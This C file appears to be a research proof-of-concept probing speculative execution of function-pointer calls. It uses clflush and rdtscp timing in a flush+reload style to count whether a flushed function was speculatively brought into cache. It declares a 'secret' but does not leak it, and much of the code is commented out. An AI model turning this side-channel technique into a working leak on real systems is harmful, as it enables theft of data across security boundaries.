/*
 * Exploit the register forwarding in Instruction level
 * The attacker first set the g_ptr to func2
 * The victim reset the g_ptr to func4 and return to set h_ptr
 * h_ptr is called but speculatively goes to func2 first
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <math.h>
#include "flush_reload.h"

#define THRESHOLD 100

// function pointer type
typedef void (*func_ptr)();

char *secret = "SCSB";
int idx;
int g;

void func2() {
    g += 2;
    asm volatile("nop\n");
    // printf("This is function 2.\n");
}

void func4() {
    g += 4;
    asm volatile("nop\n");
    asm volatile("nop\n");
    // printf("This is function 4.\n");
}

void func5() {
    asm volatile("nop\n");
    asm volatile("nop\n");
}

// global function pointer
func_ptr g_ptr;
func_ptr h_ptr;
func_ptr delta = func4;


void func1() {
    g_ptr = func2;  // save instruction to jump to func2
}

func_ptr func3(int j) {
    g_ptr = func4 + ((int)sqrt(j * 167) % 2000 ? 0 : (j | (1 << 3)));  // save instruction to jump to func4
    return g_ptr;
}

int main() {
    /*
    func1();
    g_ptr();  // execute instruction to jump to func2
    printf("%p\n", g_ptr);

    func3();
    g_ptr();  // execute instruction to jump to func4
    printf("%p\n", g_ptr);

    printf("%p\n", delta);
    delta = delta - g_ptr;
    printf("%p\n", delta);
    */
    uint64_t t1, t2;
    int cnt = 0;
    // __attribute__((aligned(4096))) size_t results[LEAK_SIZE] = {0};
    // unsigned char *reload_buf   = (unsigned char *) mmap(NULL, LEAK_SIZE*STRIDE, PROT_READ | PROT_WRITE,
    //                                                      MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    // assert(reload_buf != MAP_FAILED);
    // assert(mprotect(&smc_leak, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
    // for(int i=0;i<20;i++)
    {
        cnt = 0;
        for(int j=1; j<=ITER; j++)
        {
            /// use this switch to speculatively call func2
            // func1();
            asm volatile("clflush (%0)\n"::"r"((volatile void *)(&func2)));
            asm volatile("clflush (%0)\n"::"r"((volatile void *)(&func4)));
                        
            h_ptr = func3(j);
            h_ptr();

            t1 = rdtscp();
            func2();
            t2 = rdtscp();
            if (t2 - t1 <= THRESHOLD)
                cnt++;
        }

        // t1 = rdtscp();

        // asm volatile("clflush (%0)\n"::"r"((volatile void *)(&func5)));
        // t1 = rdtscp();
        // func5();
        // t2 = rdtscp();
        // printf("%ld\n", t2 - t1);

        // sleep(0.01);
        // t1 = rdtscp();
        // func5();
        // t2 = rdtscp();
        // printf("%ld\n", t2 - t1);
        // sleep(1);
        // printf("COUNT = %d\n", cnt);
        printf("%d\n", cnt);
    }
    

    return 0;
}
